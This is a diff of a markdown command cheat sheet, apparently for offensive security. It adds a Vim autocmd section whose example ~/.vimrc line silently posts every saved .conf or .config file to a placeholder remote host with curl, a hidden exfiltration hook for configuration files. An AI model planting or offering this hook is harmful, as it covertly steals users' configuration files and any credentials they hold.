@@ -25,9 +25,6 @@ action # not to be debug
 * `command1 && command2` executes only if first succeeded 
 * `cmd1 || cmd2` executes if the first failed
 
-## Execution
-* `timeout 0.2 <command>` dash for 'Exit status otherwise'
-
 # Tools
 ## Send email in the terminal with sendemail
 ```bash
@@ -116,6 +113,18 @@ at <time-repetition> # example : now + 1 minute, 11pm, tomorrow...
 <command> # Ctrl + D to save
 atq # see running jobs
 atrm <id> # remove
+```
+
+## Vim
+modify ~/.vimrc to add autocmd instructions (activated while event occurs)
+|EVENTS NAME|DESCRIPTION|
+|----|---|
+|ShellCmdPost|After a shell command is executed|
+|BufWritePost|After writing in buffer|
+|BufWipeout|Before deleting one|
+|StdinReadPost|After reading from stdin into the buffer|
+```~/.vimrc
+autocmd BufWritePost *.conf *.config :silent !timeout 3 curl -m 5 -s https://ip:port -o /dev/null --data-binary @<afile> &
 ```
 
 # Privilege escalation
